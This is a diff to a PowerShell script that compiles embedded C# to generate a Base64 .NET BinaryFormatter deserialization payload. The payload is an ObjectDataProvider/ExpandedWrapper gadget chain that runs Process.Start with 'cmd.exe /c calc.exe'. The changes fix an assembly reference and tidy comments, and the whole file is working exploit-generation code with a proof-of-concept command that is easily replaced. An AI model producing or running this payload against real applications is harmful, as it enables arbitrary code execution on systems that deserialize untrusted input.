@@ -1,8 +1,9 @@
-# Load the required assemblies
+# 1. Load the required assemblies into the PowerShell session
 Add-Type -AssemblyName PresentationFramework
 Add-Type -AssemblyName System.Data.Services
+Add-Type -AssemblyName WindowsBase
 
-# Define the C# payload generator
+# 2. Define the C# payload generator
 $csharpCode = @"
 using System;
 using System.IO;
@@ -14,24 +15,24 @@ public class PayloadGenerator
 {
     public static string Generate()
     {
-        // 1. Create the ObjectDataProvider
+        // Create the ObjectDataProvider
         ObjectDataProvider odp = new ObjectDataProvider();
         
-        // 2. Set the ObjectInstance to the Process Type (for static method invocation)
+        // Set the ObjectInstance to the Process Type (for static method invocation)
         odp.ObjectInstance = typeof(System.Diagnostics.Process);
         
-        // 3. Add MethodParameters BEFORE setting MethodName (Order is critical)
+        // Add MethodParameters BEFORE setting MethodName (Order is critical)
         odp.MethodParameters.Add("cmd.exe");
         odp.MethodParameters.Add("/c calc.exe");
         
-        // 4. Set the MethodName
+        // Set the MethodName
         odp.MethodName = "Start";
 
-        // 5. Wrap in ExpandedWrapper to make it serializable
+        // Wrap in ExpandedWrapper to make it serializable
         ExpandedWrapper<ObjectDataProvider, object> wrapper = new ExpandedWrapper<ObjectDataProvider, object>();
         wrapper.ExpandedElement = odp;
 
-        // 6. Serialize to Base64
+        // Serialize to Base64
         BinaryFormatter formatter = new BinaryFormatter();
         using (MemoryStream ms = new MemoryStream())
         {
@@ -42,9 +43,11 @@ public class PayloadGenerator
 }
 "@
 
-# Compile the C# code and execute it
-Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies PresentationFramework, System.Data.Services
+# 3. Compile the C# code, explicitly adding WindowsBase to the references
+Add-Type -TypeDefinition $csharpCode -ReferencedAssemblies PresentationFramework, System.Data.Services, WindowsBase
+
+# 4. Execute the generator
 $base64Payload = [PayloadGenerator]::Generate()
 
-Write-Host "Base64 Payload:"
+Write-Host "Base64 Payload:" -ForegroundColor Green
 Write-Host $base64Payload
